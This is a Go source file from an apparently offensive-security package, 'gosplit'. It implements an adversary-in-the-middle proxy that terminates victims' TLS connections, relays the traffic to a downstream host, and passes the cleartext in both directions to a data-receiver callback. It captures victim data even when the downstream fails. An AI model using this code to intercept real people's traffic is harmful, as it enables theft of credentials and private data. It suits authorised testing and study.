package gosplit

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"time"
)

type (
	// proxyConn maps the proxy server's connection to the downstream connection.
	proxyConn struct {
		net.Conn                // server connection to victim
		downstream     net.Conn // client connection to downstream target
		proxyAddr      *Addr
		victimAddr     *Addr
		downstreamAddr *Addr
		cfg            cfg          // provides getters for configuration data
		s              *ProxyServer // allows handle to decrement the connection counter
	}

	// peekConn allows peeking at the first few bytes to determine
	// if the client want's to speak TLS.
	peekConn struct {
		net.Conn
		buf *bufio.Reader
	}

	// dataHandlerConn determines if cfg implements DataReceiver and passes
	// data to the method when it does, allowing implementors to receive
	// cleartext data passing through the proxy.
	dataHandlerConn struct {
		net.Conn
		cfg      cfg
		connInfo ConnInfo
	}
)

// Write to the connection.
//
// Note: This is the victim side of the intercepted connection.
func (c *dataHandlerConn) Write(b []byte) (n int, err error) {
	if dh, ok := c.cfg.Cfg.(DataReceiver); ok {
		go dh.RecvVictimData(c.connInfo, b)
	}
	return c.Conn.Write(b)
}

// Read from the connection.
//
// Note: This is the downstream side of the intercepted connection.
func (c *dataHandlerConn) Read(b []byte) (n int, err error) {
	n, err = c.Conn.Read(b)
	if dh, ok := c.cfg.Cfg.(DataReceiver); ok {
		go dh.RecvDownstreamData(c.connInfo, b[0:n])
	}
	return
}

func (c *peekConn) Peek(n int) ([]byte, error) {
	return c.buf.Peek(n)
}

func (c *peekConn) Read(b []byte) (n int, err error) {
	return c.buf.Read(b)
}

func (c *proxyConn) log(lvl, msg string) {
	c.cfg.log(c, lvl, msg)
}

func (c *proxyConn) Close() (err error) {
	if _, ok := c.Conn.(io.Closer); ok {
		err = c.Conn.Close()
		if err != nil {
			err = fmt.Errorf("failed to close proxy connection: %w", err)
		}
	}
	if _, ok := c.downstream.(io.Closer); ok {
		e := c.downstream.Close()
		if e != nil {
			err = fmt.Errorf("; failed to close downstream conn (%w)", e)
		}
	}
	c.cfg.connEnd(c)
	return
}

func (c *proxyConn) close() {
	if err := c.Close(); err != nil {
		c.log(ErrorLogLvl, fmt.Sprintf("failed to close connection: %s", err))
	}
}

// handle accepts TCP connections from AITM victims and fingerprints
// them for TLS, followed by establishing a connection with the AITM
// downstream.
//
// Limitations:
//
// - SSL is not currently supported
//   - See https://github.com/golang/go/issues/32716
// - The client is presumed to send data over the connection first
//   - This will surely break any protocol expecting the server to
//     send first, e.g., FTP Active Mode.
// - It assumes that the initial client connection is a TLS handshake
//   - Proxying for SMTP servers relying upon STARTTLS will fail
func (c *proxyConn) handle() {

	defer c.Close()
	cTime := time.Now()

	//==================================
	// GET VICTIM & DOWNSTREAM ADDRESSES
	//==================================

	var err error
	var vA Addr
	if vA, err = getVictimAddr(c.Conn); err != nil {
		c.log(ErrorLogLvl, err.Error())
		return
	}
	c.victimAddr = &vA
	c.cfg.connStart(c)

	// reminder: nil is a valid value!
	if c.downstreamAddr, err = c.cfg.GetDownstreamAddr(*c.proxyAddr, *c.victimAddr); err != nil {
		// error getting the downstream
		c.log(ErrorLogLvl, fmt.Sprintf("failure getting downstream addr: %s", err))
		return
	}

	//================
	// FINGERPRINT TLS
	//================

	var (
		checkHs func([]byte) bool
		hsLen   = 3
	)
	if v, ok := c.cfg.Cfg.(Handshaker); ok {
		checkHs = v.IsHandshake
		hsLen = v.GetHandshakeLen()
	} else {
		checkHs = isHandshake
	}

	c.Conn.SetReadDeadline(time.Now().Add(5 * time.Second)) // TODO deadline configurable
	if peek, err := c.Conn.(*peekConn).Peek(hsLen); err != nil {
		c.log(ErrorLogLvl, "failure checking incoming proxy connection for tls")
		return
	} else if checkHs(peek) {
		c.log(DebugLogLvl, "upgrading proxy connection to tls")
		var tlsCfg *tls.Config
		tlsCfg, err = c.cfg.GetProxyTLSConfig(*c.proxyAddr, *c.victimAddr, c.downstreamAddr)
		if err != nil {
			c.log(ErrorLogLvl, "failure getting proxy tls config")
			return
		}
		c.Conn = tls.Server(c.Conn, tlsCfg)
	}
	c.Conn.SetReadDeadline(time.Time{}) // reset read deadline

	//======================
	// HANDLE NIL DOWNSTREAM
	//======================
	// ...we just want to receive some data in this case

	if c.downstreamAddr == nil {
		// nil downstream; assume victim sends first and capture data, then
		// terminate the connection
		c.dsDeadRead(cTime, vA)
		return

	}

	//==================================================
	// ESTABLISH CONNECTION WITH DOWNSTREAM FOR PROXYING
	//==================================================

	// connect to the downstream
	if uC, err := net.Dial("tcp4", net.JoinHostPort(c.downstreamAddr.IP, c.downstreamAddr.Port)); err != nil {
		c.dsDeadRead(cTime, vA)
		c.log(ErrorLogLvl, "error connecting to downstream")
		return
	} else if _, ok := c.Conn.(*tls.Conn); ok {
		// upgrade to tls
		c.log(DebugLogLvl, "upgrading downstream connection to tls")
		var tlsCfg *tls.Config
		tlsCfg, err = c.cfg.GetDownstreamTLSConfig(*c.proxyAddr, *c.victimAddr, *c.downstreamAddr)
		if err != nil {
			c.log(ErrorLogLvl, "failure getting downstream tls config")
			return
		}
		c.downstream = tls.Client(uC, tlsCfg)
	} else {
		c.downstream = uC
	}

	c.downstream = &dataHandlerConn{
		Conn: c.downstream,
		cfg:  c.cfg,
		connInfo: ConnInfo{
			Time:       cTime,
			Victim:     vA,
			Proxy:      *c.proxyAddr,
			Downstream: c.downstreamAddr,
		},
	}

	c.log(DebugLogLvl, "new connection established")

	//=================================
	// COPY TRAFFIC BETWEEN CONNECTIONS
	//=================================

	// put one side of the connection in routine
	go func() {
		if _, err := io.Copy(c, c.downstream); err != nil && !errors.Is(err, net.ErrClosed) {
			c.log(ErrorLogLvl, fmt.Sprintf("error copying data between connections (proxy to downstream): %s", err))
		}
		c.log(DebugLogLvl, "finished relaying data (proxy to downstream)")
	}()

	// block until one side of the connection dies
	if _, err := io.Copy(c.downstream, c); err != nil && !errors.Is(err, net.ErrClosed) {
		c.log(ErrorLogLvl, fmt.Sprintf("error copying data between connections (downstream to proxy): %s", err))
	}
	c.log(DebugLogLvl, "finished relaying data (downstream to proxy)")
}

// dsDeadRead is called when the downstream connecting to the downstream fails,
// allowing us to capture any data sent by the victim before altogether terminating
// the connection.
func (c *proxyConn) dsDeadRead(connTime time.Time, vA Addr) {
	if dh, ok := c.cfg.Cfg.(DataReceiver); ok {
		data := make([]byte, 4028)                                                  // TODO size configurable
		if e := c.Conn.SetReadDeadline(time.Now().Add(5 * time.Second)); e != nil { // TODO deadline configurable
			c.log(ErrorLogLvl, fmt.Sprintf("failed to set read deadline for victim connection: %s", e))
		} else if n, err := c.Conn.Read(data); err != nil {
			c.log(ErrorLogLvl, fmt.Sprintf("failed to read data from victim connection: %s", err))
		} else {
			dh.RecvDownstreamData(ConnInfo{
				Time:       connTime,
				Victim:     vA,
				Proxy:      *c.proxyAddr,
				Downstream: nil,
			}, data[:n])
		}
	}
}
